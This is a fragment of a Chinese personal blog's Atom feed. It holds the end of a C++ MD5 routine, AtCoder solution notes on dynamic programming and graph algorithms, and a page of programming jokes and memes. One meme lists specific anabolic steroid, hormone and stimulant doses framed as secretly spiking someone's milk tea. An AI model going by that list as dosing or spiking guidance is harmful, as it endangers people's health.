class="built_in">end</span>(), padded_message.<span class="built_in">begin</span>());</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 添加填充位：1个1后面跟0，直到满足条件</span></span><br><span class="line">        padded_message[original_length] = <span class="number">0x80</span>; <span class="comment">// 二进制: 10000000</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 添加原始消息长度（以位为单位，小端序）</span></span><br><span class="line">        <span class="type">uint64_t</span> bit_length = original_length * <span class="number">8</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; ++i) &#123;</span><br><span class="line">            padded_message[padded_length - <span class="number">8</span> + i] = <span class="built_in">static_cast</span>&lt;<span class="type">uint8_t</span>&gt;(bit_length &gt;&gt; (i * <span class="number">8</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 处理每个64字节块</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; padded_length; i += Constants::BLOCK_SIZE) &#123;</span><br><span class="line">            <span class="built_in">process_block</span>(&amp;padded_message[i], a, b, c, d);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 将最终哈希值转换为十六进制字符串</span></span><br><span class="line">        std::string result = </span><br><span class="line">            <span class="built_in">uint32_to_hex</span>(a) + </span><br><span class="line">            <span class="built_in">uint32_to_hex</span>(b) + </span><br><span class="line">            <span class="built_in">uint32_to_hex</span>(c) + </span><br><span class="line">            <span class="built_in">uint32_to_hex</span>(d);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;Kali&lt;/h1&gt;
&lt;p&gt;打CTF的都不好意思说自己不会用Linux…&lt;/p&gt;
&lt;h2 id=&quot;共享文件夹&quot;&gt;共享文件夹&lt;/h2&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/677780893&quot;&gt;这个&lt;/a&gt;&lt;br&gt;
地址 &lt;cod</summary>
      
    
    
    
    <category term="CTF" scheme="https://narafluorine.github.io/categories/CTF/"/>
    
    
    <category term="Algorithm" scheme="https://narafluorine.github.io/tags/Algorithm/"/>
    
    <category term="Game" scheme="https://narafluorine.github.io/tags/Game/"/>
    
  </entry>
  
  <entry>
    <title>Atcoder 2025</title>
    <link href="https://narafluorine.github.io/2024/11/04/20009_ATC_2025/"/>
    <id>https://narafluorine.github.io/2024/11/04/20009_ATC_2025/</id>
    <published>2024-11-04T04:27:36.000Z</published>
    <updated>2025-08-03T18:29:18.564Z</updated>
    
    <content type="html"><![CDATA[<h1>abc404</h1><h2 id="F">F</h2><p>概率DP.要求以下式子:$$dp[i][j]=\max_{c_1+c_2+…+c_i=m}\frac1n\sum dp[i-1][j-c_i]$$然后使用数的分解,暴力分拆出c,保证枚举的单调性,复杂度大概是 $O(m^3)$ .</p><h2 id="G">G</h2><p>写法建议:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vector&lt;array&lt;i64,3&gt; &gt;edge;</span><br></pre></td></tr></table></figure><p>建图,u,v,val,再也不用重写结构体,cmp直接对类型另起一个比较就行.</p><p>头一次碰到 <em>差分约束</em> 的题.</p><h2 id="差分约束">差分约束</h2><p>想办法变成图论题跑最短路(或最长路)的算法(你需要一个额外的点对所有点跑单源最长路).</p><p>考虑下式:$$A_i-A_j\le c$$从 $i$ 往 $j$ 连一条边权为 $c$ 的有向边.(最长路还是这么建边,但边权是 $-c$ )</p><p>求最小解:按上述方式建图跑最短路.</p><h3 id="转化-按照你要求的最短路还是最长路去加边">转化(按照你要求的最短路还是最长路去加边)</h3><p><code>a_i==a_j</code> :连两条边</p><p>$$A_i-A_j\le0$$$$A_i-A_j\ge0$$</p><h3 id="要求的东西">要求的东西,</h3><p>最短路:求最大差值.<br>最长路:求最小差值(反着来).<br>是否存在解:是否存在负环(最长路是正环).<br>是否无穷:最短路后答案是不是 <code>inf</code> ,最长路同理检查是不是 <code>-inf</code> .</p><h1>abc415</h1><p>中间翘了两场abc,rating被扣成狗了…</p><h2 id="F-2">F</h2><p>赛时因为调的时间太长了没过掉…<br>回顾线段树:单点修改,查询区间内有多少个段(11223是3个段:11,22和3)<br>这个时候要用到:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">l,r 线段树的参数</span><br><span class="line">val,len 当前区间内最大值,当前区间的长度是多少</span><br><span class="line">lc,ls 左端点字符,左端点起始的长度</span><br><span class="line">rc,rs 右端点长度,右端点起始的长度</span><br></pre></td></tr></table></figure><p>传参的时候记住, <strong>如果左右段中间匹配上且左段整段一致,那么左段左长度要拼起右段左长度</strong> ,右段同理.<br>因为这个调半天红温了…</p><h2 id="G-2">G</h2><p>换可乐问题:你有n瓶可乐,商店有好多种政策:用ai换bi瓶可乐,你想最大化喝到的可乐数量.( $a_i&lt;b_i\le 300,n\le10^{15}$ )</p><p>换可乐问题其实是一个类似背包dp的东西:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">300</span>;++i)&#123;<span class="comment">//枚举ai</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=i;j&lt;lim;++j)&#123;<span class="comment">//当前多少可乐最后喝到的个数</span></span><br><span class="line">dp[j]=<span class="built_in">max</span>(dp[j],dp[j-i+b[i]]+b[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="comment">//范围内dp</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;lim;++i)&#123;<span class="comment">//最后再加原先有的可乐数量</span></span><br><span class="line">dp[i]+=i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后对于n非常大的情况显然逮住一个最划算的往死里换是最划算的.直到进了某个范围内再使用dp的值.<br>这个范围在本题中是 $K(K+1)$ ,其中 $K$ 是值域.取1e5也是可以的.</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(n&lt;lim)res=dp[n];</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">i64 cnt=(n<span class="number">-91000</span>-ip)/(ip-iq)+<span class="number">1</span>;<span class="comment">//换的次数</span></span><br><span class="line">res+=(cnt*(ip-iq))+cnt*(iq);<span class="comment">//前面是换一个减掉的 后面是换一个得到的</span></span><br><span class="line">n-=cnt*(ip-iq);</span><br><span class="line">res+=dp[n];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1>abc416</h1><h2 id="E">E</h2><p>最短路问题,忘了怎么写了复习一下.</p><p>floyd的枚举是对该边更新的,也就是$$dpij=mxa(dpij,dpix+dpyj,dpiy+dpxj)$$所以更新是n方的.<br>同理,机场之间的航线可以新开一个点表示,所有机场到达新点的权重是t,新点到其他所有机场的权重是0.</p><h3 id="为什么疯狂WA">为什么疯狂WA???</h3><p>Floyd的枚举是kij,不是ijk,给我记死了!!!</p><h2 id="F-3">F</h2><p>树形dp,有点难写.<br>树上链形式的dp都有一个套路:<br><code>dp[i][j][k]</code> 节点i的子树中有j条链,其中i的情况是k(0不在任何一条路径上1作为端点2在链里面)</p><p>转移时首先链的条数要倒着枚举(背包).<br>然后枚举在链里面的情况:i作为端点和枚举的子v点也作为端点合并,以及i本身就在链里面,这个时候枚举子树v的杂链(0,1,2).<br>然后枚举端点情况:也是合并与合并杂链.<br>最后枚举i不在链上的情况:也是合并与杂链合并.</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(<span class="type">int</span> num,<span class="type">int</span> ko)</span></span>&#123;</span><br><span class="line">dp[num][<span class="number">1</span>][<span class="number">1</span>]=dat[num];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">auto</span> i:edge[num])&#123;</span><br><span class="line"><span class="keyword">if</span>(i==ko)<span class="keyword">continue</span>;</span><br><span class="line"><span class="built_in">dfs</span>(i,num);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=k;j&gt;=<span class="number">0</span>;--j)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> l=<span class="number">0</span>;l&lt;=j;++l)&#123;</span><br><span class="line"><span class="keyword">if</span>(l)</span><br><span class="line">dp[num][j][<span class="number">2</span>]=<span class="built_in">max</span>(dp[num][j][<span class="number">2</span>],dp[num][j-l+<span class="number">1</span>][<span class="number">1</span>]+dp[i][l][<span class="number">1</span>]);</span><br><span class="line">dp[num][j][<span class="number">2</span>]=<span class="built_in">max</span>(dp[num][j][<span class="number">2</span>],dp[num][j-l][<span class="number">2</span>]+<span class="built_in">max</span>(&#123;dp[i][l][<span class="number">0</span>],dp[i][l][<span class="number">1</span>],dp[i][l][<span class="number">2</span>]&#125;));</span><br><span class="line"><span class="keyword">if</span>(l&amp;&amp;j-l)&#123;</span><br><span class="line">dp[num][j][<span class="number">1</span>]=<span class="built_in">max</span>(dp[num][j][<span class="number">1</span>],dp[num][j-l][<span class="number">0</span>]+dat[num]+dp[i][l][<span class="number">1</span>]);</span><br><span class="line">dp[num][j][<span class="number">1</span>]=<span class="built_in">max</span>(dp[num][j][<span class="number">1</span>],dp[num][j-l][<span class="number">1</span>]+<span class="built_in">max</span>(&#123;dp[i][l][<span class="number">0</span>],dp[i][l][<span class="number">1</span>],dp[i][l][<span class="number">2</span>]&#125;));</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(l)</span><br><span class="line">dp[num][j][<span class="number">1</span>]=<span class="built_in">max</span>(dp[num][j][<span class="number">1</span>],dp[num][j-l][<span class="number">0</span>]+dat[num]+dp[i][l][<span class="number">1</span>]);</span><br><span class="line">dp[num][j][<span class="number">0</span>]=<span class="built_in">max</span>(dp[num][j][<span class="number">0</span>],dp[num][j-l][<span class="number">0</span>]+<span class="built_in">max</span>(&#123;dp[i][l][<span class="number">0</span>],dp[i][l][<span class="number">1</span>],dp[i][l][<span class="number">2</span>]&#125;));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="G-3">G</h2><p>给你1e5个最长10的字符串,你可以重复使用某一个字符串,但是一共要用k个,你要拼出来一个字典序最小的字符串输出.</p><p>首先,字符串相同长度一定会取最小的那个,所以实际上你只需要对10个字符串进行k次.<br>考虑贪心:我们发现对于字符串 $A&lt;B$ 有 $C+A&lt;C+B$ ,但是 $A+C\cancel&lt;B+C$ ,所以我们要倒着枚举.答案的最后根据贪心应该是所有字符串中字典序最小的那个,我们尝试倒着枚举后面的C(长度小于10或者是完整的后部分),然后对其拼凑一个最小的前面的字符串A,以此类推,最后答案倒序输出.</p><h1><a href="https://atcoder.jp/contests/dp">AT_dp_contest</a></h1><p>atcoder的dp场,一共26题.</p><h2 id="J-Sushi">J Sushi</h2><p>你有n碟寿司,上面只可能放1或2或3个寿司.每次你会随机一个数,然后把那个盘子上的一个寿司吃掉(没有就不吃),问你吃完所有寿司的期望随机次数是多少.</p><p>首先发现盘子的排列和答案无关,因为概率都一样,所以答案只和寿司为1,2,3的个数有关.<br>设 <code>dp[i][j][k]</code> 表示剩1个寿司剩i,2个寿司剩j,3个寿司剩k三种情况时的期望次数.有$$dp[i][j][k]=\frac{n-i-j-k}{n}dp[i][j][k]+\frac{i}{n}dp[i-1][j][k]+\frac{j}{n}dp[i+1][j-1][k]+\frac{k}{n}dp[i][j+1][k-1]+1$$然后化一下式子,dfs一下算出来就可以了…</p><h2 id="W">W</h2><p>n条线段,每个线段覆盖lr区间,如果区间内存在一个数是1,那么答案就加上wi(可能是负的),问最大答案是多少?</p><p><strong>人们说有一个典</strong> :每个线段在区间可以右端点计算贡献能够不重不漏,所以按照区间右端点排序.</p><p>设dp[i][j]表示当前正在看第i个点,前面最近第j个位置是1的最大值.<br>首先转移dp[i][i]即在第i个点放1:$$dp[i][i]=\max_{j=1}^{i-1}dp[i-1][j]$$然后转移dp[i][j]即在第i个点放0:$$dp[i][j]=dp[i-1][j]+\sum_{l_k\ge j,r_k=i}val_k$$观察发现i维似乎可以省略,所以空间变成O(n).</p><p>我们需要一个区间取max,区间加和的线段树,复杂度降成nlogn.<br>具体地:线段树开n的空间,代表dp[j]的值,i在枚举中体现.<br>转移ii的时候注意可以不选,那么就是0.<br>转移ij是直接在原位置对所有结尾是r的线段加上val.</p><p>最后答案和0取max,应对所有线段权值均为负的情况.</p><h2 id="Y-Grid-2">Y Grid 2</h2><p>给一个HxW的网格,你只能往下走或者往右走,网格上有n个点不能走,问有多少种情况.</p><p>容斥dp:设 $dp[i][op]$ 表示从初始点走到第i个点,经过op个点(偶数或者奇数个点)的情况数,最后答案就是<br><strong>ans=所有情况-sum(flag*从i点走到终点的情况*从起点走到i点的经过点情况)</strong></p><h1><a href="https://atcoder.jp/contests/typical90/tasks/">AT_typical90</a></h1><p>atcoder经典90题,据说非常劲爆,全是典.</p><h2 id="015">015</h2><p>对于给定的 $N$ ,求对于1-n的x,数列1-n里面任意选元素满足任意两个元素差值大于等于x的情况.</p><p>对于固定的 $x$ ,里面最多有 $\lceil\frac{n}{x}\rceil$ 个元素.<br>枚举元素,设为 $k$ ,有 $k-1$ 个空隙,也就有 $(k-1)(x-1)$ 个元素不能选.<br>所以对于 $x,k$ 答案是 $\binom{n-(k-1)(x-1)}{k}$ ,拓展即可得到<br>$$f(x)=\sum_{i=1}^n\binom{n-(x-1)(i-1)}{i}$$由于整除数列的收敛性,复杂度是nlogn.</p><h2 id="025">025</h2><p>设 $f(x)=\prod x_i$ 给了一个函数返回数字各位的乘积,求 $\sum_{i=0}^n\left[i-f(i)=m\right]$ 这个式子,n,m范围都是1e11.<br>发现 $f(x)$ 的取值非常少,所以从f(x)下手:<br>dfs所有数字排列(显而易见的剪枝是强制数列单调),枚举所有f(x),这个时候由于f(x)已经确定了,x也就可以根据上面的式子算出来.<br>由于枚举的数字排列是可以随意组合的,所以判断是不是解只需要把x拆开和枚举的数字比较.</p><p>时间复杂度有点玄学,1e11跑了700ms.<br>Flu没做出来是因为只发现解很少,尝试从解入手,思路歪了.</p><h2 id="030">030</h2><p>计算 $\sum_{i=1}^n[\omega(i)=k]$ ,其中 $\omega$ 表示不同质因子数.<br>前置知识:$$\frac12+\frac13+\frac15+\frac17+\frac1{11}+…\sim\ln\ln(x)$$所以我们枚举每个质数,对其直接乘倍数,模拟埃氏筛在区间直接计算即可,复杂度 $O(n\log\log n)$ .<br>听说还可以做到 $O(n)$ ,但是看起来就很麻烦…</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;abc404&lt;/h1&gt;
&lt;h2 id=&quot;F&quot;&gt;F&lt;/h2&gt;
&lt;p&gt;概率DP.要求以下式子:
$$dp[i][j]=&#92;max_{c_1+c_2+…+c_i=m}&#92;frac1n&#92;sum dp[i-1][j-c_i]$$
然后使用数的分解,暴力分拆出c,保证枚举的单调性,复杂度</summary>
      
    
    
    
    <category term="ACM" scheme="https://narafluorine.github.io/categories/ACM/"/>
    
    
    <category term="Contest" scheme="https://narafluorine.github.io/tags/Contest/"/>
    
  </entry>
  
  <entry>
    <title>文案</title>
    <link href="https://narafluorine.github.io/2024/10/31/30010_%E6%9C%89%E8%B6%A3%E6%96%87%E6%A1%88/"/>
    <id>https://narafluorine.github.io/2024/10/31/30010_%E6%9C%89%E8%B6%A3%E6%96%87%E6%A1%88/</id>
    <published>2024-10-31T08:07:49.000Z</published>
    <updated>2026-01-01T12:27:00.297Z</updated>
    
    <content type="html"><![CDATA[<p>人不能把有限的精力放到无限的寻找段子中去,所以这里几乎停止维护.</p><h2 id="爆笑题解">爆笑题解</h2><p>数竞党的防御性证明会用严谨的逻辑说明结论的正确性，而对“解题思路是如何想到的”一类的问题没有任何启发；oier/acmer 的题解则大多会提示我们从哪里入手，却不加严谨的证明。而本题解采取折中的方案：既对解题思路没有任何启发，也不加严谨的证明。</p><h2 id="AI绘图">AI绘图</h2><p>在上海买了杯蜜雪冰城,然后被赶出上海了…<br>然后配图是买了杯蜜雪冰城,东方明珠突然变成防御塔开始攻击我…</p><p><img src="https://cdn.luogu.com.cn/upload/image_hosting/6jks28xu.png" alt=""><br>我到上海说了句方言,东方明珠塔突然变成防御塔开始攻击我.<br>但是说的是粤语.从地下突然钻出广州塔开始攻击东方明珠…</p><p>上面配图非常神金</p><h2 id="积分">积分</h2><p>什么?这不是积分符号,这是一堆撬棍,遇水变答辩稿</p><h2 id="鸭子定律">鸭子定律</h2><ol><li>如果一个动物走路像鸭子、说话像鸭子、长得像鸭子、啄食也像鸭子，那它肯定就是一只鸭子。</li><li>即使在最理想的条件下，鸭子也不可能成为雄鹰，无论其多么高贵也无论其出于多么善良</li><li>鸭子可以伪装成雄鹰，可一到危难时刻它就会原形毕露。</li><li>不抛弃自己的蹼掌，不脱胎换骨换取鹰爪和利喙，鸭子永远也变不成雄鹰。</li><li>鸭子是高贵的，不能因其是鸭子而不是雄鹰就被小视。</li><li>即使最伟大的鸭子也不如一只普通的鹰飞得高。</li><li>鸭子喜群居，雄鹰独自飞。雄鹰永远不可能与鸭子为伍。</li><li>鸭子的呷呷叫声从来都得不到回应。没有人知道这是为什么。</li></ol><p>(最后一个一定要注意,有的问题你永远找不到答案)</p><h2 id="奇怪码风系列">奇怪码风系列</h2><ol><li>忘记了自己写的是C++,根本看不懂</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;bits/stdc++.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">[</span><br><span class="line">rd=[]&#123;</span><br><span class="line"><span class="type">int</span> x;</span><br><span class="line">std::cin&gt;&gt;x;</span><br><span class="line"><span class="keyword">return</span> x;</span><br><span class="line">&#125;,</span><br><span class="line">wt=[](<span class="keyword">auto</span> x)&#123;</span><br><span class="line"><span class="built_in">return</span> (std::cout&lt;&lt;x,<span class="number">0</span>);</span><br><span class="line">&#125;,</span><br><span class="line">sorted=[](<span class="keyword">auto</span> x)&#123;</span><br><span class="line">std::<span class="built_in">sort</span>(x.<span class="built_in">begin</span>(),x.<span class="built_in">end</span>());</span><br><span class="line"><span class="keyword">return</span> x;</span><br><span class="line">&#125;,</span><br><span class="line">forn=[](<span class="keyword">auto</span> f,<span class="keyword">auto</span> n)&#123;</span><br><span class="line"><span class="keyword">while</span>(n--)<span class="built_in">f</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">]&#123;[&amp;,_=forn(</span><br><span class="line">[&amp;]()<span class="keyword">mutable</span>&#123;</span><br><span class="line"><span class="keyword">auto</span> n=<span class="built_in">rd</span>();</span><br><span class="line"><span class="keyword">auto</span> k=<span class="built_in">rd</span>();</span><br><span class="line">[&amp;,a=std::<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n)]()<span class="keyword">mutable</span>&#123;</span><br><span class="line">[&amp;,_=std::<span class="built_in">generate_n</span>(a.<span class="built_in">begin</span>(),a.<span class="built_in">size</span>(),rd)]()<span class="keyword">mutable</span>&#123;</span><br><span class="line">[&amp;,ans=(k==<span class="number">1</span>&amp;&amp;a!=<span class="built_in">sorted</span>(a)?<span class="string">&quot;NO\n&quot;</span>:<span class="string">&quot;YES\n&quot;</span>)]()&#123;</span><br><span class="line">[_=<span class="built_in">wt</span>(ans)]()&#123;&#125;;</span><br><span class="line">&#125;();</span><br><span class="line">&#125;();</span><br><span class="line">&#125;();</span><br><span class="line">&#125;,</span><br><span class="line"><span class="built_in">rd</span>()</span><br><span class="line">)</span><br><span class="line">]()</span><br><span class="line">&#123;&#125;();</span><br><span class="line">&#125;();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>新运算符,趋近于(假的),现实是被拆成(i–)&gt;0</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> i=<span class="number">10</span>;</span><br><span class="line"><span class="keyword">while</span>(i--&gt;<span class="number">0</span>)&#123;</span><br><span class="line">cout&lt;&lt;i&lt;&lt;<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="不想献血该怎么说">不想献血该怎么说</h2><p>您好，是这样的，我的大脑现在档期排满，没办法分出多余的脑细胞来思考，如果你要询问的话呢，您可以先向我本人反应，这边由耳朵转告给小脑和脊柱，由身体各部门在星期日的身体例会上开会讨论，如果出结果会在15个工作日之内告诉您。</p><p>关于最近出现的用血难，献血少的问题，我们这边高度重视，迅速展开全体会议，召开第一次关于献血问题的全体身体班子的先行会议，讨论要不要献血，怎么献血，献多少，去哪献，如何建立健全完整有效的献血流程，达到规范化，科学化，制度化，做到全程工作记录，献前有纪律，献后有保障，社会治理，群力群策，完备工作台账，同时，在明年6月前召开关于第一次献血会议的扩大会议，征询更大范围人民群众意见和建议，在下半年准备细化各项工作流程，预计在2025年底前落实相关工作准备，2030年前献出第一笔血。</p><h2 id="The-Zen-of-Python">The Zen of Python</h2><p>在py里面输入import this得到下文:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">The Zen of Python, by Tim Peters</span><br><span class="line"></span><br><span class="line">Beautiful is better than ugly.</span><br><span class="line">Explicit is better than implicit.</span><br><span class="line">Simple is better than complex.</span><br><span class="line">Complex is better than complicated.</span><br><span class="line">Flat is better than nested.</span><br><span class="line">Sparse is better than dense.</span><br><span class="line">Readability counts.</span><br><span class="line">Special cases aren&#x27;t special enough to break the rules.</span><br><span class="line">Although practicality beats purity.</span><br><span class="line">Errors should never pass silently.</span><br><span class="line">Unless explicitly silenced.</span><br><span class="line">In the face of ambiguity, refuse the temptation to guess.</span><br><span class="line">There should be one-- and preferably only one --obvious way to do it.</span><br><span class="line">Although that way may not be obvious at first unless you&#x27;re Dutch.</span><br><span class="line">Now is better than never.</span><br><span class="line">Although never is often better than *right* now.</span><br><span class="line">If the implementation is hard to explain, it&#x27;s a bad idea.</span><br><span class="line">If the implementation is easy to explain, it may be a good idea.</span><br><span class="line">Namespaces are one honking great idea -- let&#x27;s do more of those!</span><br></pre></td></tr></table></figure><p>zen的意思是&quot;禅&quot;,在这里可以理解为原则.</p><h2 id="单词">单词</h2><p><code>aftermath</code> n.(战争,事故,不快事情,<s>数学</s>的)后果,创伤<br><code>cram</code> v.(为应考)临时死记硬背,临时抱佛脚</p><h2 id="偷偷往你的奶茶里放">偷偷往你的奶茶里放</h2><p>丙酸睾酮隔天4毫升，丙酸区它雄酮隔天5毫升，醋酸群波龙隔天4毫升，美替诺龙隔天4毫升，司腾博龙隔天3毫升，曲托龙隔天3毫升，生长激素每天早4IU晚4IU针剂麻黄碱训练前一瓶，口服特立补训练前十粒，口服美替诺龙训练前十粒，氧雄龙训练前20粒，康复龙训练前十粒，康力龙训练前十粒，M1T训练前十粒，克伦训练前五粒T3四粒睡前美睾酮10粒，康力龙十粒，口服美替10粒，抗雌阿诺曲错每天一粒，卡麦角林一周两粒周一一粒周日一粒保护剂跟上</p><h2 id="程序猿的菜谱">程序猿的菜谱</h2><p>2024年12月31日 元旦群友聚会晚宴菜谱:<br>1、Linux（麻辣企鹅）<br>2、golang（炒田鼠）<br>3、PHP（大象肉炒竹笋）<br>4、Python（蛇肉煎蛋）<br>5、rust（香焖大闸蟹）<br>6、Perl（爆炒骆驼肉，炸蝴蝶）<br>7、SQL（红焖海豚肉，海狮肉段）<br>酒水：Java（咖啡）<br>甜点：cookie（曲奇）<br>餐具：git fork（叉子）<br>时间：12月31日晚上18:00恭候，18:30开席</p><h2 id="崩铁匹诺康尼文案">崩铁匹诺康尼文案</h2><p>(让我想想…接下来该干什么呢?)</p><p>(喝一瓶苏乐达解闷)</p><p>吨…吨…吨…</p><p>哦, no…你早该学会听取理性的意见的.这下糟了.</p><p>一团胀气开始在你的下腹部聚集,随后化作汹涌的热浪扶摇直上.</p><p>它毫不费力地突破了你人体构造的每一道关卡,并撬开了你自控力为0的嘴巴;最终,它化作了一滩七色彩虹状的呕吐物,摧毁了你精心布置的工作环境.</p><p>周围本就寥寥无几的客人全都被这骇人的一幕吓跑了…或许这也是一种另类的减轻工作负担的方式.</p><p>这下,你理应学到教训了吧?</p><p>你将这一切怪罪于姬子和瓦尔特 $\cdot$ 杨–作为列车组的大家长,他们没有教会你 $\lceil$ 自制力 $\rfloor$ 在充满诱惑的现代社会中是多么重要.</p><p>(再来一瓶苏乐达.)</p><p>不,绝对不行.你听见了吗?绝,对,不,行.</p><p>你颤抖着抽回了那只情不自禁的手.你这一生如履薄冰…绝对不能因为一瓶小小的碳酸饮料导致自己走不到对岸.</p><h2 id="PTA-你值得拥有">PTA,你值得拥有</h2><p>你说的对，但是《吸吸皮吸》是由Check You自主研发的一款全新开放世界冒险游戏。游戏发生在一个被称作「Pleasant Teacher Alert」的幻想世界，在这里，被神选中的人将被授予「神之相机」，导引相机之力。你将扮演一位名为「艾斯么」的神秘角色，在自由的旅行中邂逅性格各异、能力独特的同伴们，和他们一起打题，找回Check You 失去的勤韧 ——同时，逐步发掘「吸吸皮吸」的真相。</p><h2 id="嘻假假-你也值得拥有">嘻假假,你也值得拥有</h2><p>你说得对，但是《C语言》是由贝尔实验室自主研发的一款全新高级编程语言。程序运行在一个被称作“内存”的虚拟世界，在这里，被神选中的人将被授予“指针”，导引地址之力。你将扮演一位名为“程序员”的神秘角色，在自由的旅行中邂逅码风各异、不写注释的同伴们，和他们一起击败异常，找回失散的指针——同时，逐步发掘“段错误”的真相。</p><h2 id="刑法">刑法</h2><p>《中华人民共和国刑法》 第三百六十三条</p><p>【制作、复制、出版、贩卖、传播淫秽物品牟利罪】以牟利为目的，制作、复制、出版、贩卖、传播淫秽物品的，处三年以下有期徒刑、拘役或者管制，并处罚金；情节严重的，处三年以上十年以下有期徒刑，并处罚金；情节特别严重的，处十年以上有期徒刑或者无期徒刑，并处罚金或者没收财产。<br>【为他人提供书号出版淫秽书刊罪】为他人提供书号，出版淫秽书刊的，处三年以下有期徒刑、拘役或者管制，并处或者单处罚金；明知他人用于出版淫秽书刊而提供书号的，依照前款的规定处罚。</p><h2 id="末流985">末流985</h2><p>（网上抄的）吉林大学真的是末流985吗？</p><p>答：是的</p><p>根据高德地图，吉林大学前卫南区西边有一条河（经评论区指出 叫永春河），往南两公里是一个水库（经评论区提出，叫八一水库），就是河的尽头。</p><p>所以吉林大学是处于这条河末流的985。</p><p>简称末流985。</p><h2 id="Frieren歌词">Frieren歌词</h2><p>Far beyond the end<br>Where we may meet again<br>One last time<br>One last goodbye</p><h2 id="珂学">珂学</h2><p>在太阳西斜的这个世界,置身天上之森.等这场战争结束后,不归之人与望眼欲穿的众人,人人本着正义之名,长存不灭的过去,逐渐消逝的未来.我回来了,纵使日薄西山,即使看不见未来,此时此刻的光辉,盼君勿忘.</p><blockquote><p>世界上最幸福的女孩-珂朵莉</p></blockquote><h2 id="英语小点">英语小点</h2><p><code>0 